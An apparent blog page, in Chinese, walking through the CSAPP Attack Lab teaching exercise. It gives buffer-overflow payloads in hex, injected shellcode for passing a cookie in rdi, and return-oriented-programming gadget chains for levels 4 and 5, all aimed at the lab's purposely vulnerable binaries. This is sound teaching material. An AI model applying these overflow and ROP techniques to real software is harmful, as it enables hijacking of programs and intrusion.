<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>[CSAPPLAB]Attack Lab | intenのblog🍦</title><meta name=keywords content="CSAPPLAB,天问之路"><meta name=description content="ctarget 首先执行getbuf函数，读取标准输入。
unsigned getbuf() { char buf[BUFFER_SIZE]; Gets(buf); return 1; } 参数 (ctarget和rtarget都有) -q 不发送成绩 -i 从文件中输入 如果你没有使用-q，就会出现
FAILED: Initialization error: Running on an illegal host [localhost.localdomain] 因为你没有使用CMU的内网，是无法建立连接的。所以每次进行操作都要带上-q。也可以用qi。
1.1level 1 观察test，getbuf和touch1
目的：将getbuf的返回地址由test改为touch1
小建议
 利用objdump -d ./ctarget>>ctarget.s得到汇编代码 思路是将touch1的开始地址，放在某个位置，以实现当ret指令被getbuf执行后会将控制权转移给touch1 一定要注意字节序 你可以使用gdb设置断点来进行调试。并且gcc会影响栈帧中buf存放的位置。需要注意  思路：getbuf函数执行ret指令后，就会从%rsp+40处获取返回地址，只要我们修改这个返回地址，改为touch1的地址，就能使程序返回touch1，而不是test。
(gdb) p (char*)0x403188 #p(print) 0x403188上存的值 $1 = 0x403188 &#34;No exploit. Getbuf returned 0x%x\n&#34; stack : padding(00..) + touch1(0x4017c0)
攻击序列touch1.txt
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 保存在touch1."><meta name=author content><link rel=canonical href=https://inten.kro1lsec.com/post/csapplabattack-lab/><link crossorigin=anonymous href=/assets/css/stylesheet.min.84cc6e7cd97516a4d4e877c6bebe5a4529afdf61f4d009e2c8bbec3a876fff4e.css integrity="sha256-hMxufNl1FqTU6HfGvr5aRSmv32H00AniyLvsOodv/04=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://inten.kro1lsec.com/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://inten.kro1lsec.com/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://inten.kro1lsec.com/favicon-32x32.png><link rel=apple-touch-icon href=https://inten.kro1lsec.com/apple-touch-icon.png><link rel=mask-icon href=https://inten.kro1lsec.com/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.82.0"><meta property="og:title" content="[CSAPPLAB]Attack Lab"><meta property="og:description" content="ctarget 首先执行getbuf函数，读取标准输入。
unsigned getbuf() { char buf[BUFFER_SIZE]; Gets(buf); return 1; } 参数 (ctarget和rtarget都有) -q 不发送成绩 -i 从文件中输入 如果你没有使用-q，就会出现
FAILED: Initialization error: Running on an illegal host [localhost.localdomain] 因为你没有使用CMU的内网，是无法建立连接的。所以每次进行操作都要带上-q。也可以用qi。
1.1level 1 观察test，getbuf和touch1
目的：将getbuf的返回地址由test改为touch1
小建议
 利用objdump -d ./ctarget>>ctarget.s得到汇编代码 思路是将touch1的开始地址，放在某个位置，以实现当ret指令被getbuf执行后会将控制权转移给touch1 一定要注意字节序 你可以使用gdb设置断点来进行调试。并且gcc会影响栈帧中buf存放的位置。需要注意  思路：getbuf函数执行ret指令后，就会从%rsp+40处获取返回地址，只要我们修改这个返回地址，改为touch1的地址，就能使程序返回touch1，而不是test。
(gdb) p (char*)0x403188 #p(print) 0x403188上存的值 $1 = 0x403188 &#34;No exploit. Getbuf returned 0x%x\n&#34; stack : padding(00..) + touch1(0x4017c0)
攻击序列touch1.txt
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 保存在touch1."><meta property="og:type" content="article"><meta property="og:url" content="https://inten.kro1lsec.com/post/csapplabattack-lab/"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-05-20T15:07:34+08:00"><meta property="article:modified_time" content="2021-05-20T15:07:34+08:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="[CSAPPLAB]Attack Lab"><meta name=twitter:description content="ctarget 首先执行getbuf函数，读取标准输入。
unsigned getbuf() { char buf[BUFFER_SIZE]; Gets(buf); return 1; } 参数 (ctarget和rtarget都有) -q 不发送成绩 -i 从文件中输入 如果你没有使用-q，就会出现
FAILED: Initialization error: Running on an illegal host [localhost.localdomain] 因为你没有使用CMU的内网，是无法建立连接的。所以每次进行操作都要带上-q。也可以用qi。
1.1level 1 观察test，getbuf和touch1
目的：将getbuf的返回地址由test改为touch1
小建议
 利用objdump -d ./ctarget>>ctarget.s得到汇编代码 思路是将touch1的开始地址，放在某个位置，以实现当ret指令被getbuf执行后会将控制权转移给touch1 一定要注意字节序 你可以使用gdb设置断点来进行调试。并且gcc会影响栈帧中buf存放的位置。需要注意  思路：getbuf函数执行ret指令后，就会从%rsp+40处获取返回地址，只要我们修改这个返回地址，改为touch1的地址，就能使程序返回touch1，而不是test。
(gdb) p (char*)0x403188 #p(print) 0x403188上存的值 $1 = 0x403188 &#34;No exploit. Getbuf returned 0x%x\n&#34; stack : padding(00..) + touch1(0x4017c0)
攻击序列touch1.txt
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 保存在touch1."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://inten.kro1lsec.com/post/"},{"@type":"ListItem","position":2,"name":"[CSAPPLAB]Attack Lab","item":"https://inten.kro1lsec.com/post/csapplabattack-lab/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"[CSAPPLAB]Attack Lab","name":"[CSAPPLAB]Attack Lab","description":"ctarget 首先执行getbuf函数，读取标准输入。\nunsigned getbuf() { char buf[BUFFER_SIZE]; Gets(buf); return 1; } 参数 (ctarget和rtarget都有) -q 不发送成绩 -i 从文件中输入 如果你没有使用-q，就会出现\nFAILED: Initialization error: Running on an illegal host [localhost.localdomain] 因为你没有使用CMU的内网，是无法建立连接的。所以每次进行操作都要带上-q。也可以用qi。\n1.1level 1 观察test，getbuf和touch1\n目的：将getbuf的返回地址由test改为touch1\n小建议\n 利用objdump -d ./ctarget\u0026gt;\u0026gt;ctarget.s得到汇编代码 思路是将touch1的开始地址，放在某个位置，以实现当ret指令被getbuf执行后会将控制权转移给touch1 一定要注意字节序 你可以使用gdb设置断点来进行调试。并且gcc会影响栈帧中buf存放的位置。需要注意  思路：getbuf函数执行ret指令后，就会从%rsp+40处获取返回地址，只要我们修改这个返回地址，改为touch1的地址，就能使程序返回touch1，而不是test。\n(gdb) p (char*)0x403188 #p(print) 0x403188上存的值 $1 = 0x403188 \u0026#34;No exploit. Getbuf returned 0x%x\\n\u0026#34; stack : padding(00..) + touch1(0x4017c0)\n攻击序列touch1.txt\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 保存在touch1.","keywords":["CSAPPLAB","天问之路"],"articleBody":"ctarget 首先执行getbuf函数，读取标准输入。\nunsigned getbuf() { char buf[BUFFER_SIZE]; Gets(buf); return 1; } 参数 (ctarget和rtarget都有) -q 不发送成绩 -i 从文件中输入 如果你没有使用-q，就会出现\nFAILED: Initialization error: Running on an illegal host [localhost.localdomain] 因为你没有使用CMU的内网，是无法建立连接的。所以每次进行操作都要带上-q。也可以用qi。\n1.1level 1 观察test，getbuf和touch1\n目的：将getbuf的返回地址由test改为touch1\n小建议\n 利用objdump -d ./ctargetctarget.s得到汇编代码 思路是将touch1的开始地址，放在某个位置，以实现当ret指令被getbuf执行后会将控制权转移给touch1 一定要注意字节序 你可以使用gdb设置断点来进行调试。并且gcc会影响栈帧中buf存放的位置。需要注意  思路：getbuf函数执行ret指令后，就会从%rsp+40处获取返回地址，只要我们修改这个返回地址，改为touch1的地址，就能使程序返回touch1，而不是test。\n(gdb) p (char*)0x403188 #p(print) 0x403188上存的值 $1 = 0x403188 \"No exploit. Getbuf returned 0x%x\\n\" stack : padding(00..) + touch1(0x4017c0)\n攻击序列touch1.txt\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 c0 17 40 00 00 00 00 00 保存在touch1.txt里，并通过hex2raw转换为字符串。并执行程序。\n./hex2raw 2.txt ./ctarget -qi 2.txt 1.2level 2 要求：要求程序执行完getbuf()后，执行touch2，而且还要传入参数，即你的cookie\n小建议\n touch2的参数val是利用rdi寄存器进行传递的 你要利用某种方式让getbuf的返回地址为touch2的地址 你的注入代码的传入参数应该等于cookie的值。 不要在注入代码内调用ret或者call 请参见附录B中有关如何使用工具生成字节级表示形式的指令序列的讨论。  touch2的代码如下\nvoid touch2(unsigned val) { vlevel = 2; /* Part of validation protocol */ if (val == cookie) { printf(\"Touch2!: You called touch2(0x%.8x)\\n\", val); validate(2); } else { printf(\"Misfire: You called touch2(0x%.8x)\\n\", val); fail(2); } exit(0); } 逻辑：比较我们传入的参数val是否等于cookie的值，如果等于就可以通过。\n本题的关键就是在改变返回地址前也设置rdi寄存器的值。\n插入的汇编代码\nmovq $0x59b997fa, %rdi pushq $0x4017ec ret 查看他的字节序表示\nAttack Lab$ vim l2.s Attack Lab$ gcc -c l2.s Attack Lab$ objdump -d l2.o l2.o： 文件格式 elf64-x86-64 Disassembly of section .text: 0000000000000000 : 0:\t48 c7 c7 fa 97 b9 59 mov $0x59b997fa,%rdi 7:\t68 ec 17 40 00 pushq $0x4017ec c:\tc3 retq stack : padding(00..) + pop_rdi(0x40141b) + arg1(cookies) + touch2(0x4017ec)\n48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 Attack Lab$ ./hex2raw 2.txt Attack Lab$ ./ctarget -qi 2.txt 1.3level 3 hexmatch和touch3的代码如下。\n/* Compare string to hex represention of unsigned value */ int hexmatch(unsigned val, char *sval) { char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; sprintf(s, \"%.8x\", val); //s=val=cookie  return strncmp(sval, s, 9) == 0; //比较cookie和第二个参数的前9位是否相同  // cookie只有8字节。这里为9的原因是我们要比较最后一个是否为'\\0'  } void touch3(char *sval) { vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) { //相同则成功  printf(\"Touch3!: You called touch3(\\\"%s\\\")\\n\", sval); validate(3); } else { printf(\"Misfire: You called touch3(\\\"%s\\\")\\n\", sval); fail(3); } exit(0); } 任务: 你的任务getbuf之后执行touch3而不是继续执行test。你必须要传递cookie字符串作为参数。每次运行时，堆栈中的地址保持不变，并在堆栈中存储一个字符串。\n小建议\n 你需要在利用缓冲区溢出的字符串中包含cookie的字符串表示形式。该字符串应该有8个十六进制数组成。注意没有前导0x 注意在c语言中的字符串表示会在末尾处加一个\\0 您注入的代码应将寄存器％rdi设置为此字符串的地址 调用函数hexmatch和strncmp时，它们会将数据压入堆栈，从而覆盖存放getbuf使用的缓冲区的内存部分。 因此，您需要注意在哪里放置您的Cookie字符串  字符串必须放在ret地址后面，因为后面函数执行时(在hexmatch函数里,向系统请求了100字节的空间，使可能覆盖变为铁定会覆盖)，会覆盖掉字符串。 而hexmatch比较的是字符串，所以cookie还要转换成字符串(用16进制表示)\n简单分析touch3\n00000000004018fa touch3: 4018fa: 53 push %rbx 4018fb: 48 89 fb mov %rdi,%rbx 4018fe: c7 05 d4 2b 20 00 03 movl $0x3,0x202bd4(%rip) # 6044dc vlevel 401905: 00 00 00 401908: 48 89 fe mov %rdi,%rsi 40190b: 8b 3d d3 2b 20 00 mov 0x202bd3(%rip),%edi # 6044e4 cookie 401911: e8 36 ff ff ff callq 40184c hexmatch 401916: 85 c0 test %eax,%eax 逻辑非常简单首先把rdi的值传递给rsi然后把cookie的值传递给rdi调用hexmatch函数。这里rsi的值应该就是我们的字符串数组的起始地址。\n这里我们注意hexmatch函数里也开辟了栈帧。并且还有随机栈偏移动。可以说字符串s的地址我们是没法估计 的。并且提示中告诉了我们hexmatch和strncmp函数可能会覆盖我们getbuf的缓冲区。所以我们的注入代码要放在一个安全的位置。我们可以把它放到text的栈帧中。我们在getbuf分配栈帧之前打一个断点。\nb *0x4017a8 (gdb) b *0x4017a8 Breakpoint 1 at 0x4017a8: file buf.c, line 12. (gdb) r -q #gdb调试时传参数放在里面 Starting program: /csapp/attack/ctarget -q warning: Error disabling address space randomization: Operation not permitted Missing separate debuginfos, use: yum debuginfo-install glibc-2.28-127.el8.x86_64 Cookie: 0x59b997fa Breakpoint 1, getbuf () at buf.c:12 12 buf.c: No such file or directory. (gdb) info r rsp rsp 0x5561dca0 0x5561dca0 stack : padding(00..) + pop_rdi(0x40141b) + arg1(stack_str) + touch3(0x4018fa) + stack_str(str(cookies))\n48 c7 c7 a8 dc 61 55 68 Attack Lab$ ./hex2raw 3.txt Attack Lab$ ./ctarget -qi 3.txt 2.1level 4 思考： 首先要把cookie传入%rdi，然后再转入到touch2函数。\n根据readme.pdf的命令列表，在gadets farm中没有发现popq %rdi。于是可以先popq %rax，然后movq %rax, %rdi\n这里的缓冲区完全被junk填充，然后从getbuf的ret向下执行。用到了两个gadget，所用到的data也放在了栈上。\n方法一\nAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rcc 19 40 00 00 00 00 00 /* jump 0x4019cc; popq %rax */\rfa 97 b9 59 00 00 00 00 /* cookie */\rc5 19 40 00 00 00 00 00 /* jump 0x4019c5; movq %rax, %rdi */\rec 17 40 00 00 00 00 00 /* touch2 */\r方法二\n@le2.txt 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 19 2b 40 00 00 00 00 00 #pop %rdi fa 97 b9 59 00 00 00 00 #cookie ec 17 40 00 00 00 00 00 #touch2 ./hex2raw 2.2level 5 肝不动了，参考别人的。\n思考：\n同Phase 5一样，这里也需要考虑如何存放cookie字符串，并且多了一个传递字符串地址到%rdi的难题。\n首先，getbuf的缓冲区应该全部填充为junk，那么cookie字符串为了不干扰exploit的正常运行，必然要放在exploit的最后。\n第二个问题，一开始在gadgets farm找到许多如下的操作：\nmov $0x909078fb,%eax lea -0x3c3876b8(%rdi),%eax movl $0xc7c78948,(%rdi) …… 所以考虑过能否使用这些数值来拼凑一个地址，然后把cookie字符串放在那里。但是由于有栈随机化，所以这个思路不行。\n后来看了一些解答，发现居然有movq %rsp, %rax这样的神操作，那样就可以用(%rsp) + x的方式来得到cookie字符串的地址了。然后就是一通拼拼凑凑，用了8个gadgets完成了exploit。\nexploit-5 关于这种需要很多gadgets才能完成的exploit，觉得思路肯定是最重要的，但是思路明晰之后，在组成gadgets的链条时，不妨用倒序查找的方法，也许会快一些。当然，今后肯定会使用一些查找gadgets的工具啦。\nAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\rAA AA AA AA AA AA AA AA\r06 1a 40 00 00 00 00 00 /* jump 0x401a06 ;movq %rsp, %rax */\rc5 19 40 00 00 00 00 00 /* jump 0x4019c5 ;movq %rax, %rdi */\rab 19 40 00 00 00 00 00 /* jump 0x4019ab ;popq %rax */\r48 00 00 00 00 00 00 00 /* distance from here to cookie string */\rdd 19 40 00 00 00 00 00 /* jump 0x4019dd ;movl %eax, %edx */\r34 1a 40 00 00 00 00 00 /* jump 0x401a34 ;movl %edx, %ecx */\r13 1a 40 00 00 00 00 00 /* jump 0x401a13 ;movl %ecx, %esi */\rd6 19 40 00 00 00 00 00 /* jump 0x4019d6 ;lea (%rdi,%rsi,1),%rax */\rc5 19 40 00 00 00 00 00 /* jump 0x4019c5 ;movq %rax, %rdi */\rfa 18 40 00 00 00 00 00 /* touch3 */\r35 39 62 39 39 37 66 61 /* cookie string */\r00 00 00 00 00 00 00 00 /* string ends with 00 */\r","wordCount":"988","inLanguage":"en","datePublished":"2021-05-20T15:07:34+08:00","dateModified":"2021-05-20T15:07:34+08:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://inten.kro1lsec.com/post/csapplabattack-lab/"},"publisher":{"@type":"Organization","name":"intenのblog🍦","logo":{"@type":"ImageObject","url":"https://inten.kro1lsec.com/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script><noscript><style type=text/css>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><header class=header><nav class=nav><div class=logo><a href=https://inten.kro1lsec.com/ accesskey=h title="intenのblog🍦 (Alt + H)">intenのblog🍦</a>
<span class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></span></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://inten.kro1lsec.com/archives title=Archive><span>Archive</span></a></li><li><a href=https://inten.kro1lsec.com/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://inten.kro1lsec.com/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>[CSAPPLAB]Attack Lab</h1><div class=post-meta>May 20, 2021&nbsp;·&nbsp;5 min</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><div class=details>Table of Contents</div></summary><div class=inner><ul><li><a href=#11level-1 aria-label="1.1level 1"><strong>1.1level 1</strong></a></li><li><a href=#12level-2 aria-label="1.2level 2"><strong>1.2level 2</strong></a></li><li><a href=#13level-3 aria-label="1.3level 3"><strong>1.3level 3</strong></a></li><li><a href=#21level-4 aria-label="2.1level 4"><strong>2.1level 4</strong></a></li><li><a href=#22level-5 aria-label="2.2level 5"><strong>2.2level 5</strong></a></li></ul></div></details></div><div class=post-content><p><strong>ctarget</strong>
首先执行getbuf函数，读取标准输入。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>unsigned</span> <span style=color:#a6e22e>getbuf</span>()
{
	<span style=color:#66d9ef>char</span> buf[BUFFER_SIZE];
	Gets(buf);
	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>1</span>;
}
</code></pre></div><p>参数 (ctarget和rtarget都有)
-q 不发送成绩
-i 从文件中输入
如果你没有使用-q，就会出现</p><p>FAILED: Initialization error: Running on an illegal host [localhost.localdomain]
因为你没有使用CMU的内网，是无法建立连接的。所以每次进行操作都要带上-q。也可以用qi。</p><h3 id=11level-1><strong>1.1level 1</strong><a hidden class=anchor aria-hidden=true href=#11level-1>#</a></h3><p>观察test，getbuf和touch1</p><p>目的：将getbuf的返回地址由test改为touch1</p><p>小建议</p><ul><li>利用<code>objdump -d ./ctarget>>ctarget.s</code>得到汇编代码</li><li>思路是将<code>touch1</code>的开始地址，放在某个位置，以实现当<code>ret</code>指令被<code>getbuf</code>执行后会将控制权转移给<code>touch1</code></li><li>一定要注意字节序</li><li>你可以使用<code>gdb</code>设置断点来进行调试。并且<code>gcc</code>会影响栈帧中<code>buf</code>存放的位置。需要注意</li></ul><p>思路：getbuf函数执行<strong>ret</strong>指令后，就会从%rsp+40处获取返回地址，只要我们修改这个返回地址，改为touch1的地址，就能使程序返回touch1，而不是test。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> p <span style=color:#f92672>(</span>char*<span style=color:#f92672>)</span>0x403188
<span style=color:#75715e>#p(print) 0x403188上存的值</span>
$1 <span style=color:#f92672>=</span> 0x403188 <span style=color:#e6db74>&#34;No exploit.  Getbuf returned 0x%x\n&#34;</span>
</code></pre></div><p>stack : <code>padding(00..) + touch1(0x4017c0)</code></p><p></p><p>攻击序列touch1.txt</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00 
</code></pre></div><p>保存在touch1.txt里，并通过hex2raw转换为字符串。并执行程序。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>./hex2raw &lt;touch1.txt&gt;2.txt 
./ctarget -qi 2.txt
</code></pre></div><p><img loading=lazy src=https://www.kro1lsec.com:442/images/2021/04/28/20210428160021.png alt=image-20210428160021166></p><h3 id=12level-2><strong>1.2level 2</strong><a hidden class=anchor aria-hidden=true href=#12level-2>#</a></h3><p>要求：要求程序执行完getbuf()后，执行touch2，而且还要传入参数，即你的cookie</p><p>小建议</p><ul><li><code>touch2</code>的参数<code>val</code>是利用<code>rdi</code>寄存器进行传递的</li><li>你要利用某种方式让<code>getbuf</code>的返回地址为<code>touch2</code>的地址</li><li>你的注入代码的传入参数应该等于<code>cookie</code>的值。</li><li>不要在注入代码内调用<code>ret</code>或者<code>call</code></li><li>请参见附录B中有关如何使用工具生成字节级表示形式的指令序列的讨论。</li></ul><p><code>touch2</code>的代码如下</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>touch2</span>(<span style=color:#66d9ef>unsigned</span> val)
 {
     vlevel <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>; <span style=color:#75715e>/* Part of validation protocol */</span>
     <span style=color:#66d9ef>if</span> (val <span style=color:#f92672>==</span> cookie) {
        printf(<span style=color:#e6db74>&#34;Touch2!: You called touch2(0x%.8x)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, val);
        validate(<span style=color:#ae81ff>2</span>);
     } <span style=color:#66d9ef>else</span> {
          printf(<span style=color:#e6db74>&#34;Misfire: You called touch2(0x%.8x)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, val);
          fail(<span style=color:#ae81ff>2</span>);
    }
   exit(<span style=color:#ae81ff>0</span>);
 }
</code></pre></div><p>逻辑：比较我们传入的参数<code>val</code>是否等于<code>cookie</code>的值，如果等于就可以通过。</p><p>本题的关键就是在改变返回地址前也设置<code>rdi</code>寄存器的值。</p><p>插入的汇编代码</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>movq    $0x59b997fa, %rdi
pushq   $0x4017ec
ret
</code></pre></div><p>查看他的字节序表示</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>Attack Lab$ vim l2.s
Attack Lab$ gcc -c l2.s
Attack Lab$ objdump -d l2.o

l2.o：     文件格式 elf64-x86-64


Disassembly of section .text:

<span style=color:#ae81ff>0000000000000000</span> &lt;.text&gt;:
   0:	<span style=color:#ae81ff>48</span> c7 c7 fa <span style=color:#ae81ff>97</span> b9 <span style=color:#ae81ff>59</span> 	mov    $0x59b997fa,%rdi
   7:	<span style=color:#ae81ff>68</span> ec <span style=color:#ae81ff>17</span> <span style=color:#ae81ff>40</span> <span style=color:#ae81ff>00</span>       	pushq  $0x4017ec
   c:	c3                   	retq  
</code></pre></div><p>stack : <code>padding(00..) + pop_rdi(0x40141b) + arg1(cookies) + touch2(0x4017ec)</code></p><p></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-touch2.txt data-lang=touch2.txt>48 c7 c7 fa
97 b9 59 68
ec 17 40 00
c3 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
78 dc 61 55
</code></pre></div><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>Attack Lab$ ./hex2raw &lt;touch2.txt&gt;2.txt 
Attack Lab$ ./ctarget -qi 2.txt 
</code></pre></div><h3 id=13level-3><strong>1.3level 3</strong><a hidden class=anchor aria-hidden=true href=#13level-3>#</a></h3><p><code>hexmatch</code>和<code>touch3</code>的代码如下。</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>/* Compare string to hex represention of unsigned value */</span>
 <span style=color:#66d9ef>int</span> <span style=color:#a6e22e>hexmatch</span>(<span style=color:#66d9ef>unsigned</span> val, <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>sval)
{
     <span style=color:#66d9ef>char</span> cbuf[<span style=color:#ae81ff>110</span>];
     <span style=color:#75715e>/* Make position of check string unpredictable */</span>
     <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>s <span style=color:#f92672>=</span> cbuf <span style=color:#f92672>+</span> random() <span style=color:#f92672>%</span> <span style=color:#ae81ff>100</span>;
     sprintf(s, <span style=color:#e6db74>&#34;%.8x&#34;</span>, val); <span style=color:#75715e>//s=val=cookie
</span><span style=color:#75715e></span>     <span style=color:#66d9ef>return</span> strncmp(sval, s, <span style=color:#ae81ff>9</span>) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>; <span style=color:#75715e>//比较cookie和第二个参数的前9位是否相同
</span><span style=color:#75715e></span>   <span style=color:#75715e>// cookie只有8字节。这里为9的原因是我们要比较最后一个是否为&#39;\0&#39;
</span><span style=color:#75715e></span> }
<span style=color:#66d9ef>void</span> <span style=color:#a6e22e>touch3</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>sval)
 {
    vlevel <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>; <span style=color:#75715e>/* Part of validation protocol */</span>
    <span style=color:#66d9ef>if</span> (hexmatch(cookie, sval)) { <span style=color:#75715e>//相同则成功
</span><span style=color:#75715e></span>         printf(<span style=color:#e6db74>&#34;Touch3!: You called touch3(</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, sval);
         validate(<span style=color:#ae81ff>3</span>);
    } <span style=color:#66d9ef>else</span> {
         printf(<span style=color:#e6db74>&#34;Misfire: You called touch3(</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>)</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, sval);
         fail(<span style=color:#ae81ff>3</span>);
     }
    exit(<span style=color:#ae81ff>0</span>);
 }
